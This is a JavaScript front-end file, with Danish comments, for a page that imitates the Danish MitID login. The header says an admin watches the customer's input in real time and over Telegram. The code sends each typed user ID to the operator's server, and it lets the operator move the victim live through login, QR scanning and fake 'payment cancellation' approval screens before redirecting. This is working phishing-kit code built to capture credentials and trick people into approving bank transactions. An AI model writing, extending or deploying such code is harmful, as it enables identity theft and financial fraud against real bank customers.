/* ════════════════════════════════════════════════════════════
   visitor.js — 3 trin: Bruger-ID → QR → Betaling. Live-styret.
   Admin ser kundens indtastning i realtid (+ Telegram).
   ════════════════════════════════════════════════════════════ */
let lastSig = null;
let qrDrawn = null;

const $ = (id) => document.getElementById(id);
const show = (el) => { if (el) el.classList.remove('hidden'); };
const hide = (el) => { if (el) el.classList.add('hidden'); };

function sig(s) {
  return JSON.stringify([s.live, s.flow, s.sessionId, s.tekst, (s.action||{}).title, (s.action||{}).amount, (s.action||{}).detail]);
}

/* ── QR ── */
function drawQR(url) {
  const el = $('qrcode');
  if (!el) return;
  el.innerHTML = '';
  if (window.QRCode) {
    new QRCode(el, { text: url, width: 200, height: 200, colorDark: '#000', colorLight: '#fff', correctLevel: QRCode.CorrectLevel.M });
  }
}

/* ── TRIN-VISNINGER ── */
function showBrugerId(s) {
  hide($('stepQr')); hide($('stepBetaling')); hide($('loaderContainer'));
  show($('stepBruger'));
  $('formHeading').textContent = 'Log på';
}

function showQr(s) {
  hide($('stepBruger')); hide($('stepBetaling')); hide($('loaderContainer'));
  show($('stepQr'));
  $('formHeading').textContent = 'Log på';
  const url = s.sessionId ? window.location.origin + '/r/' + s.sessionId : 'https://mitid.dk';
  if (url !== qrDrawn) { drawQR(url); qrDrawn = url; }
}

function showBetaling(s) {
  hide($('stepBruger')); hide($('stepQr')); hide($('loaderContainer'));
  show($('stepBetaling'));
  $('formHeading').textContent = 'Bekræft';
  const a = s.action || {};
  $('betAmount').textContent = a.amount || '';
  $('betTitle').textContent = a.title || 'Slet denne betaling';
  $('betDetail').textContent = a.detail || '';
}


/* ── TRIN: ANNULLERING AF BETALING (rød MitID-stil) ── */
function showAnnuller(s) {
  hide($('stepBruger')); hide($('stepQr')); hide($('stepBetaling')); hide($('loaderContainer'));
  show($('stepBetaling'));
  $('formHeading').textContent = 'Annullering';
  const a = s.action || {};
  $('betAmount').textContent = a.amount || '';
  $('betAmount').style.color = '#dc2626';
  $('betTitle').textContent = a.title || 'Annullering af betaling';
  $('betDetail').textContent = a.detail || '';
  $('betAmount').style.color = '';
}

function showWait() {
  hide($('stepBruger')); hide($('stepQr')); hide($('stepBetaling'));
  show($('loaderContainer'));
  $('formHeading').textContent = '';
}

function showApproved(s) {
  hide($('stepBruger')); hide($('stepQr')); hide($('stepBetaling')); hide($('loaderContainer'));
  $('formHeading').textContent = 'Godkendt';
  if (s.target && s.target.trim()) {
    setTimeout(() => { window.location.href = s.target.trim(); }, 1500);
  }
}

function hideAll() {
  hide($('stepBruger')); hide($('stepQr')); hide($('stepBetaling')); hide($('loaderContainer'));
}

/* ── RENDER ── */
function render(s) {
  const sg = sig(s);
  if (sg === lastSig) return;
  lastSig = sg;
  if (!s.live) { hideAll(); $('formHeading').textContent = 'MitID'; return; }
  switch (s.flow) {
    case 'brugerid': showBrugerId(s); break;
    case 'scan': showQr(s); break;
    case 'betaling': showBetaling(s); break;
    case 'annuller': showAnnuller(s); break;
    case 'wait': showWait(); break;
    case 'approved': showApproved(s); break;
    default: showBrugerId(s);
  }
}

/* ── BRUGER-ID INPUT: send til admin LIVE mens kunden taster ── */
let typedTimer = null;
const brugerInput = $('brugerIdInput');
const brugerBtn = $('brugerBtn');

brugerInput.addEventListener('input', function () {
  const v = this.value.trim();
  brugerBtn.disabled = !v;
  brugerBtn.className = 'btn-primary ' + (v ? 'active' : 'disabled');
  // live-til admin (debounce 500ms)
  clearTimeout(typedTimer);
  typedTimer = setTimeout(() => {
    fetch('/api/typed', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ brugerId: v })
    }).catch(() => {});
  }, 500);
});

// Skjul/Vis knap
$('hideBtn').addEventListener('click', function () {
  if (brugerInput.type === 'text') { brugerInput.type = 'password'; this.textContent = 'Vis'; }
  else { brugerInput.type = 'text'; this.textContent = 'Skjul'; }
});

// FORTSÆT: registrér + gå til vent (admin styrer videre)
brugerBtn.addEventListener('click', () => {
  const v = brugerInput.value.trim();
  if (!v) return;
  fetch('/api/typed', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ brugerId: v })
  }).catch(() => {});
});

/* ── POLL + SOCKET ── */
async function poll() {
  try {
    const r = await fetch('/api/public-state', { cache: 'no-store' });
    render(await r.json());
  } catch (e) {}
}
poll();
try { const socket = io(); socket.on('state-update', render); } catch (e) {}
setInterval(poll, 1000);